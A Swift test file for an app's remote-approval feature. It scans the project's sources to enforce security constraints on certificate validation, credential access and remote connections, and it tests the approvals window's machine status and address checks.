    @Test func theKeychainAccountPrefixRoundTripsEnvironmentIds() {
        let id = "a/b c"
        let account = KeychainRemoteCredentialStore.account(for: id)
        #expect(String(account.dropFirst("approvals-remote-".count)).removingPercentEncoding == id)
    }

    // MARK: Source scans

    static func sources() throws -> [(name: String, code: String)] {
        let root = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().appendingPathComponent("Sources")
        let files = FileManager.default.enumerator(at: root, includingPropertiesForKeys: nil)!.compactMap { $0 as? URL }.filter { $0.pathExtension == "swift" }
        return try files.map { f in
            (f.lastPathComponent, try String(contentsOf: f, encoding: .utf8).split(separator: "\n", omittingEmptySubsequences: false)
                .filter { !$0.trimmingCharacters(in: .whitespaces).hasPrefix("//") }.joined(separator: "\n"))
        }
    }

    @Test func discoveryFileIsReadOnlyAndNamesNoCommand() throws {
        let t = try #require(Self.sources().first { $0.name == "PeerLinkDiscovery.swift" }).code
        #expect(t.components(separatedBy: "\"peerLinks.list\"").count - 1 == 1)
        #expect(t.components(separatedBy: ".send(").count - 1 == 1)
        for forbidden in ["orchestration.", "dispatchCommand", "runtime-request", "subscribe", "access:write", "decision", "RemoteApprovalCredential", "remoteApprovalStore"] {
            #expect(!t.contains(forbidden), "PeerLinkDiscovery.swift mentions \(forbidden)")
        }
    }

    @Test func certificateValidationIsTheSystemDefaultEverywhere() throws {
        for (name, t) in try Self.sources() {
            for forbidden in ["URLAuthenticationChallenge", "SecTrust", "serverTrust", "didReceive challenge", "NSAllowsArbitraryLoads",
                              "allowsInvalidCertificates", "urlSession(_ s: URLSession, didReceive", "URLCredential(trust"] {
                #expect(!t.contains(forbidden), "\(name) touches certificate trust: \(forbidden)")
            }
        }
    }

    @Test func theLoopbackFixturePolicyIsNotReachableFromTheProductionWiring() throws {
        for (name, t) in try Self.sources() where t.contains("loopbackFixture") {
            #expect(["RemoteOrigin.swift", "Snapshots.swift"].contains(name), "\(name) uses the loopback fixture policy")
        }
        let main = try #require(Self.sources().first { $0.name == "main.swift" && $0.code.contains("KeychainTokenStore") }).code
        #expect(!main.contains("loopbackFixture") && !main.contains("remotePolicy"))
    }

    @Test func remoteConnectionsAreBuiltOnlyThroughTheVerifiedOriginTypes() throws {
        let all = try Self.sources()
        // The proof types are minted in one place, so nothing else can hold one without the identity check.
        for (name, t) in all where name != "RemoteOrigin.swift" {
            #expect(!t.contains("VerifiedRemoteOrigin(origin:") && !t.contains("ValidatedRemoteOrigin(url:"), "\(name) builds an origin without the checks")
        }
        // The remote decision socket and the remote session have a short, known list of callers.
        for (name, t) in all where t.contains("ApprovalSocket(remote:") { #expect(["HuddleModel+Approvals.swift", "RemoteCheck.swift"].contains(name), "\(name) opens a remote decision socket") }
        for (name, t) in all where t.contains("RemoteSession.make") { #expect(["RemoteOrigin.swift", "RemoteApproval.swift", "ApprovalSocket.swift"].contains(name), "\(name) opens a remote session") }
        for (name, t) in all where t.contains("remoteApprovalStore") || t.contains("RemoteCredentialStore") {
            #expect(["HuddleModel.swift", "HuddleModel+Approvals.swift", "HuddleModel+RemoteApprovals.swift", "RemoteApproval.swift", "main.swift", "Snapshots.swift"].contains(name), "\(name) reads remote credentials")
        }
        // Only the origin policy decides what is https; no other file builds a wss:// or https:// URL for a remote machine.
        for (name, t) in all where t.contains("\"wss\"") { #expect(["RemoteOrigin.swift"].contains(name), "\(name) builds a wss URL") }
    }

    @Test func remoteFilesNeverNameTheDecisionCommand() throws {
        for (name, t) in try Self.sources() where ["RemoteOrigin.swift", "RemoteApproval.swift", "HuddleModel+RemoteApprovals.swift"].contains(name) {
            for forbidden in ["runtime-request.respond", "orchestration.dispatchCommand", "webSocketTask", "acceptForSession", "acceptAlways"] {
                #expect(!t.contains(forbidden), "\(name) mentions \(forbidden)")
            }
        }
    }
}

@MainActor
@Suite("Inline approvals window state")
struct ApprovalsWindowStateTests {
    static let env = "env_remote"

    @Test func aMachineIsOffThenOnThenNeedsRepairAfterTheLoginIsRefused() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m); await model.refresh()
        #expect(model.approvalMachines.map(\.label) == ["Studio Mac"])
        #expect(model.remoteApprovalStatus(Self.env) == .off)
        model.rejectedRemoteApprovals.insert(Self.env)                         // what a refused login leaves behind
        #expect(model.remoteApprovalStatus(Self.env) == .needsRepair)
        try await model.enableRemoteApprovals(environmentId: Self.env, address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true)
        #expect(model.remoteApprovalStatus(Self.env) == .on && !model.rejectedRemoteApprovals.contains(Self.env))
        #expect(model.savedAddress(forEnvironment: Self.env) == m.remoteBase)
        model.disableRemoteApprovals(environmentId: Self.env)
        #expect(model.remoteApprovalStatus(Self.env) == .off)
    }

    @Test func aMachineWithALoginButNoLinkStaysListedSoItCanBeRemoved() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m); await model.refresh()
        try await model.enableRemoteApprovals(environmentId: Self.env, address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true)
        model.storedRemoteApprovalIds.append("env_gone")                          // a credential for a machine that is not linked any more
        #expect(model.approvalMachines.map(\.id).contains("env_gone"))
        #expect(model.approvalMachines.first { $0.id == "env_gone" }?.label.hasPrefix("Unlinked machine") == true)
    }

    @Test func addressCandidatesListTheSavedOneFirstThenTheDiscoveredOnesWithoutRepeats() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m); await model.refresh()
        model.discoveredUrls[Self.env] = ["https://b.example.ts.net", m.remoteBase, "https://c.example.ts.net"]
        #expect(model.candidateAddresses(forEnvironment: Self.env) == ["https://b.example.ts.net", m.remoteBase, "https://c.example.ts.net"])
        try await model.enableRemoteApprovals(environmentId: Self.env, address: m.remoteBase, pairingCode: "remote-code", acknowledgeUnlisted: true)
        let list = model.candidateAddresses(forEnvironment: Self.env)
        #expect(list.first == m.remoteBase && list.count == 3 && Set(list).count == 3)
    }

    @Test func eachAddressIsCheckedAgainstTheMachineYouLinked() async throws {
        let m = try await startTwoMachines(); defer { m.stop() }
        let model = makeRemoteModel(m); await model.refresh()
        #expect(await model.checkAddress(m.remoteBase, environmentId: Self.env) == .thisMachine)
        #expect(await model.checkAddress(m.remoteBase, environmentId: "some_other_machine") == .otherMachine)
        #expect(await model.checkAddress("http://127.0.0.1:1", environmentId: Self.env) == .unreachable)
        if case .invalid = await model.checkAddress("http://example.com", environmentId: Self.env) {} else { Issue.record("plain http must be invalid") }
    }
}
